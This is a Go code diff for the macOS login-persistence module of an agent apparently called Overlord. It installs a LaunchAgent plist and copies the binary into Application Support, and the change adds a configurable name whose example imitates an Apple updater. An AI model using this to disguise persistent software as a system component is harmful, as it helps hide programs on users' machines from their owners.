@@ -9,6 +9,7 @@ import (
 	"os"
 	"os/user"
 	"path/filepath"
+	"strings"
 	"text/template"
 )
 
@@ -17,7 +18,7 @@ const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
 <plist version="1.0">
 <dict>
 	<key>Label</key>
-	<string>com.overlord.agent</string>
+	<string>{{.Label}}</string>
 	<key>ProgramArguments</key>
 	<array>
 		<string>{{.ExePath}}</string>
@@ -34,12 +35,26 @@ const launchAgentPlist = `<?xml version="1.0" encoding="UTF-8"?>
 </plist>
 `
 
+func binaryName() string {
+	if DefaultStartupName != "" {
+		return DefaultStartupName
+	}
+	return "agent"
+}
+
+func plistLabel() string {
+	if DefaultStartupName != "" {
+		return DefaultStartupName
+	}
+	return "com.overlord.agent"
+}
+
 func getPlistPath() (string, error) {
 	usr, err := user.Current()
 	if err != nil {
 		return "", err
 	}
-	return filepath.Join(usr.HomeDir, "Library", "LaunchAgents", "com.overlord.agent.plist"), nil
+	return filepath.Join(usr.HomeDir, "Library", "LaunchAgents", plistLabel()+".plist"), nil
 }
 
 func getTargetPath() (string, error) {
@@ -47,10 +62,14 @@ func getTargetPath() (string, error) {
 	if err != nil {
 		return "", err
 	}
-	return filepath.Join(usr.HomeDir, "Library", "Application Support", "Overlord", "agent"), nil
+	return filepath.Join(usr.HomeDir, "Library", "Application Support", "Overlord", binaryName()), nil
 }
 
 func install(exePath string) error {
+
+	if DefaultStartupName != "" && !strings.HasPrefix(DefaultStartupName, "com.") {
+		return fmt.Errorf("startup name %q is invalid for macOS: LaunchAgent labels must start with \"com.\" (e.g. com.apple.updater)", DefaultStartupName)
+	}
 
 	targetPath, err := getTargetPath()
 	if err != nil {
@@ -88,8 +107,10 @@ func install(exePath string) error {
 	}
 
 	data := struct {
+		Label   string
 		ExePath string
 	}{
+		Label:   plistLabel(),
 		ExePath: targetPath,
 	}
 
@@ -167,8 +188,10 @@ func configure(exePath string) error {
 	}
 
 	data := struct {
+		Label   string
 		ExePath string
 	}{
+		Label:   plistLabel(),
 		ExePath: exePath,
 	}
 
